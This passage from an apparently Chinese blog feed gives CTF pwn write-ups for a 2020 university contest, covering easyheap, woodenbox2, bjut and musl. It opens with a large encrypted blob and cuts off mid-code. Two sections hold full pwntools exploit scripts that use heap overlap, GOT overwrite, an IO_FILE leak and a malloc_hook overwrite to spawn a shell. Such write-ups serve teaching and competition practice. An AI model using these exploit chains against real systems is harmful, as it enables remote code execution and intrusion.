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 </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>高校战“疫”网络安全分享赛 pwn 复现</title>
    <link href="https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://nocbtm.github.io/2020/03/09/高校战“疫”网络安全分享赛-pwn-复现/</id>
    <published>2020-03-09T06:59:08.000Z</published>
    <updated>2020-03-10T07:09:53.648Z</updated>
    
    <content type="html"><![CDATA[<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>程序没开PIE，got表可写</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>ptr[v1]清零了，但*(void **)ptr[v1]没有清零。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int sub_4009E4()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  if ( ++dword_6020AC &gt; 4 )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  puts(&quot;What is the index of the item to be deleted?&quot;);</span><br><span class="line">  v1 = sub_400890();</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 6 || !ptr[v1] )</span><br><span class="line">    return puts(&quot;Delete failed.&quot;);</span><br><span class="line">  free(*(void **)ptr[v1]);</span><br><span class="line">  free(ptr[v1]);</span><br><span class="line">  ptr[v1] = 0LL;</span><br><span class="line">  return puts(&quot;Delete successfully.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先申请俩次堆块都是0x10，然后free掉，看到add函数里是先进行malloc(0x10)，然后在做check，然后再申请check(0x400)，所以由于free之后会残留指针，在free掉俩个堆块之后，故意输入大数字让他check size fail直接返回，然后申请一个0x10的堆块就可以实现堆块重叠。通过edit前俩次的堆块来覆盖最后一次malloc的堆块的ptr指针来指向chunk_list的位置，然后伪造chunk结构指向got，并且show一下就可以知道libc了，然后修改free_got为system然后free一个内容为/bin/sh的堆块就可以开启shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">io=process(&apos;./easyheap&apos;)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">io=remote(&apos;121.36.209.145&apos;,9997)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./easyheap&apos;)</span><br><span class="line"></span><br><span class="line">def choice(idx):</span><br><span class="line">    io.sendlineafter(&apos;Your choice:\n&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    choice(1)</span><br><span class="line">    io.sendafter(&apos;this message?\n&apos;, str(size))</span><br><span class="line">    if size&lt; 0x400:</span><br><span class="line">    io.sendafter(&apos;content of the message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">choice(2)</span><br><span class="line">io.sendlineafter(&apos;deleted?\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line">    choice(3)</span><br><span class="line">    io.sendlineafter(&apos;modified?\n&apos;,str(idx))</span><br><span class="line">    io.sendafter(&apos;message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line"># ------------------------------------------------</span><br><span class="line">onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line">chunk_list=0x6020C0</span><br><span class="line"># ------------------------------------------------</span><br><span class="line">add(0x18,0x18 * &quot;\x10&quot;) #0</span><br><span class="line">add(0x18,0x18 * &quot;\x11&quot;) #1</span><br><span class="line">dele(0)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line"></span><br><span class="line">add(0x18,0x18 * &apos;\x12&apos;) #2</span><br><span class="line">edit(1,p64(0) + p64(0x18) + p64(chunk_list))</span><br><span class="line">edit(2,p64(chunk_list + 8) + p64(chunk_list))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(chunk_list) + p64(chunk_list + 0x18) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;__libc_start_main&apos;]) + p64(chunk_list + 0x30) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;free&apos;]))</span><br><span class="line"></span><br><span class="line">edit(2,p64(elf.plt[&apos;puts&apos;]))</span><br><span class="line">dele(4)</span><br><span class="line">__libc_start_main = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc = __libc_start_main - lib.symbols[b&apos;__libc_start_main&apos;]</span><br><span class="line">lib.address = libc</span><br><span class="line">system = lib.symbols[&apos;system&apos;]</span><br><span class="line">binsh = lib.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">__dele_hook = lib.symbols[&apos;__free_hook&apos;]</span><br><span class="line">__malloc_hook = lib.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">__realloc_hook = lib.symbols[&apos;__realloc_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(5,p64(system))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(binsh))</span><br><span class="line">dele(0)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="woodenbox2"><a href="#woodenbox2" class="headerlink" title="woodenbox2"></a>woodenbox2</h2><p>got表可写，其余保护全开</p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>change_item()函数里面没有对size做限制，堆溢出。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目难点在于没有输出功能，需要打io_file泄露libc基址。然后fastbin attack 打malloc_hook,这里onegadget失效，用realloc 调整偏移即可。<br>iofile泄露原理可参考EX师傅博客<a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>成功率 16分之一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    try:</span><br><span class="line">        if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">        io=process(&apos;./woodenbox2&apos;)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">        else:</span><br><span class="line">        io=remote(&apos;121.36.215.224&apos;,9998)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">        elf=ELF(&apos;./woodenbox2&apos;)</span><br><span class="line"></span><br><span class="line">        def choice(idx):</span><br><span class="line">            io.sendlineafter(&apos;Your choice:&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def add(size, content):</span><br><span class="line">            choice(1)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;, str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        def free(idx):</span><br><span class="line">        choice(3)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">        def edit(idx,size, content):</span><br><span class="line">            choice(2)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line">        iofile_off = [0x25dd,0xf5eb] #_IO_2_1_stderr_+157</span><br><span class="line">        onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line"></span><br><span class="line">        add(0x20,&apos;aaaa&apos;)#0</span><br><span class="line">        add(0x40,&apos;aaaa&apos;)#1</span><br><span class="line">        add(0x60,&apos;aaaa&apos;)#2</span><br><span class="line">        add(0xa0,&apos;aaaa&apos;)#3</span><br><span class="line"></span><br><span class="line">        edit(0,0x40,&apos;a&apos;*0x20+p64(0)+p64(0xc1))</span><br><span class="line">        free(1) #1</span><br><span class="line">        free(1) #2</span><br><span class="line">        add(0x40,&apos;bbbb&apos;) #0</span><br><span class="line">        edit(0,0x60,&apos;a&apos;*0x40+p64(0)+p64(0x71)+p16(iofile_off[0]))</span><br><span class="line">        add(0x60,&apos;aaaa&apos;) # 2</span><br><span class="line">        add(0x60,&apos;aaa&apos;+p64(0)*6+p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;) #3</span><br><span class="line">        io.recv(0x40)</span><br><span class="line">        leak=u64(io.recv(8))</span><br><span class="line">        info(hex(leak))</span><br><span class="line">        libc.address = leak-(0x7f35bc64a600-0x7f35bc285000)</span><br><span class="line">        log.success(hex(libc.address))</span><br><span class="line">        malloc_hook = libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">        free_hook = libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">        one = libc.address+onegadgets[1]</span><br><span class="line">        log.success(hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">        add(0x60,&apos;cccc&apos;)#4</span><br><span class="line">        add(0x60,&apos;dddd&apos;)#5</span><br><span class="line">        free(5)</span><br><span class="line">        edit(0,0x100,0xa0*&apos;\x17&apos;+p64(0)+p64(0x71)+p64(malloc_hook-0x23))</span><br><span class="line">        add(0x60,&apos;bbbb&apos;)</span><br><span class="line">        add(0x60,&apos;d&apos;*0xb+p64(one)+p64(libc.symbols[&quot;realloc&quot;]+13))</span><br><span class="line">        choice(1)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;, str(60))</span><br><span class="line">        io.interactive()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></p><h2 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h2><p>got表可写，pie没开</p><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>show 和 edit功能，可以输入负数，造成数组上溢。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;The index of your hw:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt;= 15 &amp;&amp; qword_404140[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Input your hw:&quot;);</span><br><span class="line">    read(0, qword_404140[v1], dword_4040E0[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out of range!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>通过数组上溢泄露free_got内容，然后修改 free_got为system，然后释放/bin/sh的堆块</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h2 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h2><p>做这个题的时候当时是蒙的，使用的是musl libc跟平时的glibc有很大差异。其中最大的差异是muls不支持延迟绑定，没有 malloc_hook等<br>具体参考 <a href="https://my.oschina.net/u/2306127/blog/1592004" target="_blank" rel="noopener">https://my.oschina.net/u/2306127/blog/1592004</a></p><h3 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>add功能有一次堆溢出的机会</p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>溢出修改size然后free造成overlapping<br>free时检查了in_use和下一个chunk的prev_size，提前伪造好prev_size<br>overlapping后再取出来，可以uaf，free chunk的链表头部在libc，uaf之后show泄露libc地址，然后edit把fd和bk改为0x602030，利用双向链表写fd bk的操作把一个堆地址写入0x602040，将heap_store劫持到堆上，实现任意地址读写<br>show和edit的次数有限制，但是可以通过任意地址读写覆盖计数器<br>got plt都不可写，没有hook<br>可以通过任意地址读写改写栈，getshell<br>利用任意地址读，读libc中的environ泄露栈地址，算出栈顶地址，然后利用任意地址写覆盖返回地址</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 